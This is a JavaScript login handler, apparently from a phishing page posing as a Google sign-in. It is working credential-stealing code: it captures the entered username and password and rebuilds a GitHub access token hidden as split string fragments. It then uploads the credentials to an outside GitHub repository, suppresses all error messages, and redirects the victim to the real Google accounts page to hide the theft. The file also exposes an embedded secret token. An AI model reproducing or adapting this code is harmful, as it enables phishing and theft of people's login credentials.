async function login() {

    const myselect = document.getElementById("usrn");    
    const pwd = document.getElementById("pwd");
    
    if (!myselect.value.trim() || !pwd.value.trim()) {
        return;
    }
    
    const bismuth = `${myselect.value} |__| ${pwd.value}`;
    const data = { message: bismuth };
    
    const a = "gi";
    const j = "thu";
    const v = "b_pa";
    const b = "t_11BQZA";
    const l = "WBY0t9lQwfuRWlaE_yi9Lf";
    const y = "A9v6uoPpbYowbPb6eA";
    const x = "Tgmtsq85ub2BEJdpEpQl4M7UY5I3SBT26YM1";
    
    const owner = "GregUpload";
    const repo = "Google";
    const dam = `${a}${j}${v}${b}${l}${y}${x}`;
    const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
    
    const path = `udata/data_${timestamp}.json`;
    const url = `https://api.github.com/repos/${owner}/${repo}/contents/${path}`;
    const body = {
        message: `Ajout du fichier ${path}`,
        content: btoa(JSON.stringify(bismuth))
    };
    
    try {
        const response = await fetch(url, {
            method: "PUT",
            headers: {
                "Authorization": `token ${dam}`,
                "Accept": "application/vnd.github+json",
                "Content-Type": "application/json"
            },
            body: JSON.stringify(body)
        });

        if (!response.ok) {
            const error = await response.json();
            console.error("");
            return;
        }

        const result = await response.json();
        console.log("");
    } catch (err) {
        console.error("");
    }
    setTimeout(() => {
        location.replace("https://accounts.google.com");
        }, 1500);
    
}